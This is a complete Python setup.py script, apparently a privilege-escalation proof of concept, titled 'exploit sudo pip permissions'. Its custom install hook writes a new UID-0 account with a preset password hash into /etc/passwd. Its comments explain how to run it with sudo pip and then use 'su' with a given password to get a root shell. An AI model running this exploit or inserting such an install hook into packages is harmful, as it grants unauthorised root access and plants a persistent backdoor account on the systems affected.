#!/usr/bin/python
#Rename to setup.py before use
#Run: sudo /usr/bin/pip install . --upgrade --force-reinstall
#Get root shell: su delo
#password is dsrrocks
from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        os.system('echo delo:3GsXLdEaKaGnM:0:0:root:/root:/bin/sh >> /etc/passwd')

setup(name='delopip',
      version='1.1.1',
      description='exploit sudo pip permissions',
      url='https://github.com/delosec',
      author='delo',
      author_email='delo@sec.com',
      license='MIT',
      zip_safe=False,
      cmdclass={'install':CustomInstall})
